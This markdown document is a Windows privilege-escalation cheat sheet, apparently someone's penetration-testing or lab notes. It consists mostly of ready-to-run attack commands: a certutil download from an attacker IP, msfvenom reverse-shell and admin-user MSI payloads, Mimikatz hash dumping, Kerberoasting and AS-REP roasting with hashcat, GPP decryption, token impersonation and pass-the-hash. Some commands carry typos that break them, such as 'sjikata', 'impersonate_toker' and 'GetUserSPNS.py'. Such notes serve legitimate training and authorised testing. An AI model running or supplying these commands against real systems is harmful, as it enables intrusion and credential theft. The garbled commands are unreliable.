# Privesc

## Downloading winPEAS files with Certutil

```
winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe

certutil -urlcache -f http://10.10.15.5/winPEASx64.exe winpeas.exe
```

## Powerview

Start Powershell - powershell -ep bypass -ep bypasses the execution policy of powershell allowing you to easily run scripts

```
powershell -ep bypass
```

Start PowerView

```
. .\PowerView.ps1
```

Enumerate the domain users -

```
Get-NetUser | select cn
```

Enumerate the domain groups

```
Get-NetGroup -GroupName *admin*
```

Additional queries

https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

## PowerUp a powershell script

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell:

```
. .\PowerUp.ps1
Invoke-AllChecks
```

This script is useful but requires PowerShell. If you are to use this script I advise using a one-off PowerShell command. For example:

```
powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}”
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.27.83 LPORT=4443 -e x86/sjikata -
f exe -o Advanced.exe
```

Encoded payload

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai
LHOST=10.11.9.134 LPORT=9091 -f exe -o bruce.exe
```

## Sherlock PowerShell script exploit suggester

Edit Sherlock.ps1 file and add line at the end.

```
...
Find-AllVulns
```

## BloodHound

```
powershell -ep bypass

.\Downloads\SharpHound.ps1

Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```

Upload zip file into bloodhound.

## Mimikatz

Load mimikatz.

```
privilege::debug
```

Ensure that the output is "Privilege '20' ok" - This ensures that you're running mimikatz as an administrator

Dump hashes

```
lsadump::lsa /patch
```

## Token Impersonation with Incognito

On a meterpreter shell load incognito

```
list_tokens -u
impersonate_toker token\\name
rev2self on meterpreter (reverts back to the initial permissions)
```

## Kerberoasting

ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

Impacket has a tool called "GetNPUsers.py" (located in Impacket/Examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. (Enumerate valid users with kerbrute)

```
GetNPUsers.py spookysec.local/ -usersfile userlist.txt

GetNPUsers.py spookysec.local/svc-admin -no-pass
```

Once we have user credentials we can retrieve services with administrator accounts

Using the GetUserSPNS.py (impacket)

```
GetUserSPNS.py domain.local/user:password -dc-ip 192.168.57.140 -request
GetUserSPNS.py -request -dc-ip IP TARGET(domain/user)
```

Or

```
GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.117.212 -request
```

Find hashcat hash type

```
hashcat --1 help | grep Kerberos
hashcat -m 13100 hashes4.txt rockyou.txt -O
```

## Abusing GPP

Find the Groups.xml file.
Retrieve the cpassword hash. Decrypt.

```
gpp-decrypt hash
```

## Always Install Elevated

Check with:

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```
# Generate payload to add user to admin group
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o setup.msi

OR

# Create a reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o reverse.msi

# Run it on the target machine:
msiexec /quiet /qn /i setup.msi 
msiexec /quiet /qn /i reverse.msi        <--- Needs a netcat listener
```


## Abusing Token Privileges For Windows Local Privilege Escalation

While using meterpreter

ps shows all of the running processes

```
meterpreter > migrate PID
to migrate to a higher authority process(ex: spoolsv.exe)

meterpreter > load kiwi
to load mimikatz
```

TODO: Good reads

https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/

https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/

## Windows-Exploit-Suggester

update the database

```
$ ./windows-exploit-suggester.py --update
```

install dependencies

(install python-xlrd, \$ pip install xlrd --upgrade)

feed it "systeminfo" input, and point it to the microsoft database

```
$ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt
```

[Windows-Exploit-Suggester GitHub](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

## Pass the hash attack

```
pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //IP cmd.exe
```

## Privilege Escalation Awesome Scripts SUITE

[GitHub - carlospolop/privilege-escalation-awesome-scripts-suite: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

## Additional reading

FuzzySecurity | Windows Privilege Escalation Fundamentals

[FuzzySecurity | Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)[FuzzySecurity | Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)

Windows Privilege Escalation Guide

[Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
